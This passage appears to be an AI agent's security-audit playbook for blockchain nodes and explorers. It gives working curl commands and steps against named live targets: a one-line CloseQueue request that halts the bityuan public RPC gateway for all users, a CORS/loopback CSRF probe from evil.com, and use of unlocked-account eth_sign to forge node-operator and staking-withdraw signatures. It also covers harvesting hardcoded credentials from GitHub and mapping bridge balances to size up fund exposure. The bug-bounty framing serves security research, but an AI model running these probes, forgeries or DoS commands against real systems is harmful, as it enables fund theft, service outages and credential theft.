4. **Admin Unix-socket "trusted session" bypass vs. remote-reachability claim.** A local Unix domain socket bound mode 0600 in the data dir is the sanctioned admin channel — `WsSession::new_trusted` clears every gate. Confirm it is NOT TCP-reachable and not reverse-proxy-forwarded. Watch for the network-share fallback: if the data root is on NFS/SMB, the socket relocates to `XDG_RUNTIME_DIR` or `$HOME/.cache/epix-admin-<hash>/admin.sock` in a 0700 dir — but the path is recorded in `admin.sock.path` next to the data root, and a writable share can swap that file (symlink attack, equivalent to existing filesystem compromise). Document the fallback chain if present.

5. **Restricted-gateway allow-list as a separate command-tier.** `GATEWAY_READ_COMMANDS` is an explicit, curated allow-list of admin commands safe for anonymous visitors (xite list, stats, peers, feed) — every other admin command is refused with `"{cmd} is disabled on this gateway"`. This is the right pattern (default-deny, allow-list, vetted per command) and should be cited as such. The failure mode to hunt: a newly-added admin command that should be server-side-only but is accidentally added to the read allow-list (the code comment explicitly warns about this — "a newly added admin command is refused on a gateway until it is vetted here"). Audit the allow-list against the admin set: any intersection with state-mutating / key-revealing / network-egress commands is a gateway finding.

See `examples/hunts/web3/blockchain-rpc-attack-surface-audit/references/epixnet-rust-ws-trust-graph-2026-08-17.md` for the full 8-boundary map with file:line evidence (WRAPPER_ID_BASE mechanism, `as` metacommand, wrapper_key==public-address auth, security_gate bypasses, admin Unix socket, gateway mode, dbQuery SSRF verdict, permissionAdd self-grant chain).

### CORS `*` + loopback-bypass CSRF pattern (bityuan class — 2026-08)
Chains with `CORS AllowOrigins ["*"]` + a loopback IP allowlist or `IsLoopback→true` shortcut (Chain33/bityuan, also the EpixNet `ui_check_cors` default-off-for-non-loopback case) let any `evil.com` page `fetch()` to `127.0.0.1:<port>` — the browser sends `Origin: evil.com`, the server replies `*`, and `RemoteAddr == 127.0.0.1` triggers the loopback-trust path that skips the function whitelist. Result: privileged wallet/admin methods reachable via CSRF from any web page the victim visits. Always probe: `curl -H Origin:http://evil.com http://127.0.0.1:<port>... -v` and check for `access-control-allow-origin: *` AND any RemoteAddr-based trust shortcut. Same pattern in EpixNet as `ui_check_cors` (state.rs:4244-4249) defaulting to `*self.ui_loopback.read().await` — a LAN-bound node without `ui_check_cors=true` allows cross-origin xite-content reads (enumeration). The unsafe-method CSRF check runs unconditionally, so state changes are still gated — but cross-origin GET reads (which xites are served) leak.

### Standard probe set for any WS command-API node
Whichever language the node is in, run these FIRST after enumerating dispatch:
1. **Auth-bind test** — does any client-controlled field (id, token, key) compared to a constant or public identifier grant admin? Send the privileged value and a normal value; if privileged-value requests succeed and normal-value requests fail, the "secret" is the constant itself — note that it is published in the source /open-source/ and thus public.
2. **wrapper_key/public-address as auth** — if the WS bind key is a public identifier (xite address, username, chain id), document that "authentication" is purely the bind; authorization is whatever gates the dispatch layer applies post-bind.
3. **Self-grant chain** — find any `permissionAdd`/`grant`/`roleAssign`-style handler. Is it admin-gated? Is the literal "ADMIN"/"root"/"superuser" denylisted? Does it require a server-issued nonce? If no to all three → the chain `bind WS → grant self ADMIN → run admin commands` works.
4. **Metacommand inheritance** — for `as`/`sudo`/`impersonate`/`actionAs`, does the inner dispatch inherit the caller's elevated id/session? If yes and the caller's elevation came from a forgeable field (pattern 1), the metacommand is a cross-target pivot.
5. **Restricted-gateway tier audit** — if the node has a "restricted"/"public gateway" mode, find the allow-list (e.g. `GATEWAY_READ_COMMANDS`). Diff it against the admin set; flag any state-mutating, key-revealing, or network-egress command that slipped in.
6. **CORS + loopback-trust** — does cross-origin fetch succeed when `RemoteAddr == 127.0.0.1`? Default-off cross-origin gates on non-loopback binds are a common silent misconfig.
7. **dbQuery / chart-query / arbitrary-SQL handlers** — admin-gated? If on a restricted-gateway read allow-list, does the underlying query helper enforce SELECT-only or accept DDL/DML? SSRF verdict: negative if local SQLite; positive if the query can reference external endpoints (Postgres `COPY`, `lo_import`, MySQL `LOAD DATA`, DuckDB `read_csv('http://...')`).

### Fetching bysomeone-pinned forks when `git remote-https` is missing
`go.mod:replace` pins like `github.com/bysomeone/chain33 v0.0.0-20260730...-f4252a73` are not on `33cn`. Fetch via `curl -L https://codeload.github.com/bysomeone/chain33/zip/<commit> -o /tmp/chain33-fork.zip && unzip -q && mv chain33-<hash> /tmp/chain33` (same for `plugin`). Wrapper itself via `codeload.github.com/bityuan/bityuan/zip/refs/heads/master`. `unzip -o` + explicit `mv chain33-master /tmp/chain33` avoids `/tmp` name collisions.
**Hardened recipe from 2026-08 bityuan session (git at `/usr/local/go/bin/go`, `git --exec-path` = `/usr/local/libexec/git-core` missing `git-remote-https`):**
```bash
# wrapper (63 files expected)
curl -L https://codeload.github.com/bityuan/bityuan/zip/refs/heads/master -o /tmp/bityuan.zip
file /tmp/bityuan.zip && unzip -l /tmp/bityuan.zip | wc -l  # expect 63, else HTML error page
unzip -o /tmp/bityuan.zip -d /tmp && mv /tmp/bityuan-master /tmp/bityuan
# pinned forks from go.mod replace commit
curl -L https://codeload.github.com/bysomeone/chain33/zip/f4252a735f2d -o /tmp/chain33-fork.zip
curl -L https://codeload.github.com/bysomeone/plugin/zip/1ef9e26f3e85 -o /tmp/plugin-fork.zip
unzip -l /tmp/chain33-fork.zip | wc -l  # expect ~985 (659 Go files); bysomeone/plugin ~2867
unzip -q -d /tmp /tmp/chain33-fork.zip && mv /tmp/chain33-f4252a735f2d /tmp/chain33
# validate
find /tmp/chain33 -name "*.go" | wc -l; find /tmp/bysomeone_plugin_extract -name "*.go" | wc -l
export PATH=/usr/local/go/bin:$PATH; go version  # go 1.23 at that path on TencentOS
```
If `file` says `HTML` or `wc -l` is 63-wrapper-only, the codeload URL returned an error page — retry with explicit commit hash from `go.mod`.

### Unlocked account signing oracle (MultiVAC CHAINER 2026-08-17)
When `eth_accounts` returns addresses, the node has **unlocked accounts** — private keys are loaded in memory and accessible via RPC. Test the full signing stack:

1. `eth_accounts` → returns unlocked addresses
2. `eth_getBalance` → check if the account has funds
3. `eth_getTransactionCount` with `pending` → reveals in-flight txs (prior exploitation attempts)
4. `eth_sign(account, data)` → ECDSA signature oracle for arbitrary data. If it returns a signature (not `-32601`), the private key is accessible.
5. `eth_signTransaction(tx_params with from=unlocked_account, nonce=0)` → returns fully signed raw tx with v/r/s. Proves full transaction signing capability.
6. `eth_sendTransaction(tx_params)` → if it returns "insufficient funds" instead of `-32601 not found`, the method IS enabled — only the zero balance blocks execution.

**Error-code diagnostic for eth_sendTransaction:**
- `-32601 method does not exist/is not available` → method disabled, dead end
- `-32000 insufficient funds for gas * price + value` → method ENABLED, account has no balance
- `-32000 replacement transaction underpriced` → a tx with that nonce already in mempool
- `-32000 nonce not specified` → method works, needs nonce parameter
- `-32000 intrinsic gas too low` → method works, gas too low

**Pending nonce as exploitation indicator:** `eth_getTransactionCount` with `"pending"` returns the mempool nonce. If it's `0x2` while latest is `0x0`, two transactions are stuck — someone already tried to exploit this account. Always check pending vs latest nonce to detect prior attacks.

See `examples/hunts/web3/blockchain-rpc-attack-surface-audit/references/multivac-chainer-rpc-signing-2026-08-17.md` for full evidence + the explorer-JS contract mapping and GitHub credential extraction that completed the chain.

### Bridge/staking fund exposure verification (MultiVAC 2026-08-17)
After identifying bridge/staking addresses from explorer JS, verify live balances via `eth_getBalance` to quantify fund exposure. All MultiVAC addresses turned out to be EOAs (no smart contract code) — private key holders control the funds directly:

```bash
# For each address extracted from explorer JS:
curl -sS -X POST https://rpc.mtv.ac/ -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"eth_getBalance","params":["0xAAAA3eE...","latest"],"id":1}'
curl -sS -X POST https://rpc.mtv.ac/ -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"eth_getCode","params":["0xAAAA3eE...","latest"],"id":1}'
# code = "0x" (1 byte) → EOA, not a contract → key holder controls everything
```

MultiVAC totals: Bridge 248K MTV, BEP20 Bridge 205M MTV, ERC20 Bridge 326M MTV, Staking Pool 3.34B MTV = ~3.87B MTV (~$387K). Always convert hex to decimal and divide by 10^18 for human-readable amounts.

Also trace fund flows via explorer's `/transaction/list` endpoint:
```bash
curl -sS -X POST https://e.mtv.ac/transaction/list \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "address=0xAAAA3eE...&pageNum=1&pageSize=5"
# Response shows from/to/value for each tx → trace User→Bridge→Staking flow
```

### Staking withdraw signature chain (MultiVAC 2026-08-17)
Staking explorers often have a `/stake/withdraw` backend endpoint that accepts a **signed message** for authentication. The signing oracle from `eth_sign` can forge this signature:

1. Read `staking.js` to find the withdraw flow: `goWithdraw()` builds a message "Please sign this message to … ownership of this account:{address} … Amount to withdraw from staking:{amount} … Timestamp:{ts}" and calls `wallet.signMessage()`.
2. The signature + params are POSTed to `/stake/withdraw` as form-encoded fields: `address`, `timestamp`, `msg`, `sign`.
3. If the unlocked RPC account is a registered staker (`/stake/updateStaker` returns status>0), and has stake balance, the forged signature enables withdraw.
4. Check staker status: `POST /account/get` with `address=0x2781bcb...` → `stakerStatus: 1` = registered staker.
5. Check stake balance: `stake.balance`, `stake.mainnet`, `stake.erc20`, `stake.bep20` fields.

**Prerequisite:** The account must have stake to withdraw. MultiVAC's unlocked account had 0 stake — the chain is armed but not immediately exploitable. Document this distinction honestly.

### eth_coinbase confirms unlocked account role (MultiVAC 2026-08-17)
`eth_coinbase` returns the node's designated mining/signing account. If it matches the address from `eth_accounts`, the unlocked account IS the node operator — not just a random unlocked wallet:
```bash
curl -sS -X POST https://rpc.mtv.ac/ -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"eth_coinbase","params":[],"id":1}'
# Returns: {"result":"0x2781bcb..."} — confirms this is the coinbase/miner account
```
This elevates the severity: the signing oracle forges the **node operator's identity**, not just a user wallet. Any dApp that authenticates via `eth_sign` will accept the forged signature as the operator.

### Explorer page-specific JS endpoint discovery
Each explorer page (`bridge.html`, `staking.html`, `account.html`, `block.html`, `transaction.html`) loads its own JS bundle with unique API endpoints. Download each and grep:

```bash
for js in account.js block.js transaction.js bridge.js staking.js; do
  curl -sk "https://<explorer>/js/${js}?<hash>" -o /tmp/${js}
  grep -oE '"/[a-zA-Z0-9/_-]+"' /tmp/${js} | sort -u
  grep -oiE '(withdraw|unstake|claim|release|unlock|approve|transfer|owner|admin|signer|operator)' /tmp/${js}
done
```

MultiVAC endpoints found this way:
- `account.js` → `/account/get`, `/block/listByMiner`, `/token/holders`, `/transaction/list`, `/transfer/list`
- `block.js` → `/block/get`, `/transaction/list`
- `transaction.js` → `/transaction/get`, `/transfer/listByTx`
- `staking.js` → `/stake/cancelWithdraw`, `/stake/count`, `/stake/tops`, `/stake/updateStaker`, `/stake/withdraw`

### Explorer-JS contract address extraction
Block explorer frontends (Vue/React SPAs) embed bridge/staking/swap contract addresses in their minified JS bundles. Extract them:

```bash
# 1. Find page-specific JS bundles from HTML
curl -sk https://<explorer>/bridge.html | grep -oP 'src="[^"]*\.js[^"]*"'
curl -sk https://<explorer>/staking.html | grep -oP 'src="[^"]*\.js[^"]*"'

# 2. Download and grep for 40-char hex addresses
curl -sk https://<explorer>/js/bridge.js?v=... -o /tmp/bridge.js
grep -oP '0x[0-9a-fA-F]{40}' /tmp/bridge.js | sort -u
# Also grep the wallet/helper library JS for Infura keys, RPC URLs:
grep -oP 'https://[^"]*infura[^"]*' /tmp/bridge.js
```

Also extract API endpoint formats from the JS — explorers often use `axios.post` with `qs.stringify` (form-encoded), NOT JSON. The param names differ from what you'd guess (`pageNum`/`pageSize` not `page`/`size`, `word` not `query`/`key`). Read the JS source to find exact parameter names before testing injection.

### GitHub hardcoded credential extraction for chain nodes
Chain node source repos often commit default RPC credentials and private-key CLI flags:

```bash
# Fetch config files via raw.githubusercontent.com (works even when git clone is broken)
curl -sk "https://raw.githubusercontent.com/<org>/<repo>/master/configs/config/config.go" | grep -i "RPCUser\|RPCPass\|rpcuser\|rpcpass\|private\|secret"
curl -sk "https://raw.githubusercontent.com/<org>/<repo>/master/<chain>_dev.conf"
curl -sk "https://api.github.com/orgs/<org>/repos?per_page=100"  # list repos
curl -sk "https://api.github.com/repos/<org>/<repo>/contents/"  # browse directory
```

Common leaks:
- Default `RPCUser`/`RPCPass` in config struct initialization (Go)
- Dev config files (`*_dev.conf`) with plaintext credentials
- Private key CLI flags (`--sk`, `--privkey`) — keys visible in process listings
- Infura/Alchemy API keys in frontend wallet JS
- AWS S3 bucket URLs in READMEs (open bucket enumeration)

Note: GitHub API has rate limits (60 req/hr unauthenticated). Clone repos if `git-remote-https` is available; otherwise use `raw.githubusercontent.com` for specific files.

### Chain stats from explorer /summary endpoint
Many explorers expose a `/summary` POST endpoint (no params needed) that returns chain-level stats:
- Total blocks, accounts, transactions
- Total staked amount
- Circulating supply / market cap
- Latest block with miner/validator address

This is a quick way to assess chain health and identify high-value targets (bridge/staking addresses with large balances).

## Pitfalls
- **Assuming reflection dispatch is possible** — Go `net/rpc` restricts to exported methods; check before spending time.
- **Overclaiming RCE from a fixed-filename file write** — be honest about the constraint and name the missing link.
- **Ignoring the adaptor** — `eth-rpc`/`evm-rpc` sidecars often have weaker validation than the main node.
- **Missing the default bind address** — `0.0.0.0` + no auth = public pre-auth surface; `127.0.0.1` changes the trust boundary.
- **Assuming Go patterns apply to Rust chains** — Rust nodes (Aptos, Solana, Sui) don't have goroutine dumps; they have thread dumps, malloc profiling, failpoints. Different deserialization (BCS/SCALE/Borsh vs protobuf). See `cdc-blockchain-audit` skill, `references/rust-blockchain-node-audit.md`.
- **Single-pass audit overclaims remote RCE — 4-auditor cross-audit required (bityuan 2026-08-16)** — Initial CDC overclaimed pre-auth remote RCE; second-order adversarial batch (RPC-AUTH / WALLET / VM / BLIND-SPOT each with Prove this ISN'T exploitable) revealed default localhost:8801 bind blocks remote direct (RemoteAddr kernel TCP, not XFF), real vector is CORS * + loopback CSRF evil.com→127.0.0.1. Always run cross-audit with VERIFIED FACT vs ASSUMPTION table + curl kill-tests before claiming remote. See examples/hunts/cdc/cdc-multi-target-audit/references/bityuan-cross-audit-2026-08-16.md.
- **Jelasin santai runtut is a skill signal (bityuan 2026-08-16)** — Formal dense report without analogies triggers user frustration. Enforce 8-step warung narrative: target vs kenyataan, why center is hardened, backdoor, 6-step chain, line numbers, minimal POC, honest PROVEN vs THEORETICAL, fix. Tables + short paragraphs, lo/gue tone. See examples/hunts/cdc/cdc-multi-target-audit/references/bityuan-cross-audit-2026-08-16.md.
- **Third-party vs self-harm impact triage (bityuan 2026-08-16)** — `CloseQueue` via `127.0.0.1` alone is self-harm, not a bounty. Only counts when victim is third party: external `https://bityuan.com/rpc` `Chain33.CloseQueue → {"isOk":true} → 502 86 methods` proves server `3.113.172.95` halts for all users. Always classify fundtheft/admin with external PoC: `GetSeed/DumpPrivkey/UnLock → 403 method is not authorized` = honest NO for external; `CreateRawTransaction → 200 hex` but `SendTransaction → ErrSign` = no theft without privkey. Report PROVEN LIVE vs THEORETICAL separately.
- **Public gateway admin DoS is still critical (bityuan 2026-08-16)** — Even when wallet is safe, `CloseQueue` unauth on `bityuan.com/rpc` is third-party admin takeover by availability. One `curl -X POST https://bityuan.com/rpc -d '{"method":"Chain33.CloseQueue"}'` → `isOk:true` then 2 to 3 min 502 for every method until systemd/docker restart. `access-control-allow-origin: *` makes it triggerable from `evil.com`. Do not dismiss DoS as self-harm — victim is the public gateway and all its users.

## Reference Files
- Case evidence from the bityuan/chain33, multivac, aioz, partisia, theta, u2u, and epixnet hunts (15 files: trust graphs, re-audit matrices, chainer maps, fuzz case studies) is preserved at `examples/hunts/web3/blockchain-rpc-attack-surface-audit/references/` — moved out of the product layer 2026-09-07; body sections above cite the individual files.
- Cross-skill case pointer: Naoris NaoX Chain (Chain 46512) comprehensive debug/admin exploitation case study at `examples/hunts/web3/custom-chain-rpc-exploit/references/naoris-naox-chain-case-study.md`; Berachain mainnet 80094 mempool/CORS overflow study at `examples/hunts/cdc/multi-target-cdc-audit/references/berachain-mempool-cors-2026-08.md`.

- `scripts/rpc_fuzz.py` — Reusable RPC edge-case fuzzer: overflow values (max uint256), negative gas/value, 0x0 address, massive storage slots, type confusion, large calldata OOM test. Parameterized by `RPC_URL` and `CONTRACT_ADDR`.
- `scripts/explorer_fuzz.py` — Reusable explorer API fuzzer: SSTI (Jinja2/Tornado/Vue/Nunjucks), SQLi (OR 1=1/UNION/SLEEP), NoSQL ($gt/$where/$ne), cmd injection, path traversal, prototype pollution. Tests /search, /block/list, /summary. Parameterized by `EXPLORER_URL`.
- `scripts/advanced_fuzz.py` — Reusable advanced fuzzer: WebSocket discovery (ws/wss root + custom paths), batch RPC (100/200/500 + mixed methods + batch sendTransaction), eth_getLogs massive range DoS, custom namespace method enumeration, error revelation. Parameterized by `HOST`/`PORT`/`USE_SSL`.
- `scripts/smuggling_fuzz.py` — Reusable HTTP request smuggling fuzzer: CL-TE, TE-CL, CL-CL, TE-header-injection via raw TLS sockets. Flags non-400 differential parsing responses. Parameterized by `HOST1`/`HOST2`.

## Quality Bar
- [ ] Every candidate has exact file:line evidence for source and sink?
- [ ] Auth model and default bind address documented?
- [ ] Dispatch model (net/rpc exported-method constraint) explicitly verified?
- [ ] Fixed-filename / content-control constraints honestly assessed?
- [ ] PoC JSON-RPC payload provided for the best candidate?
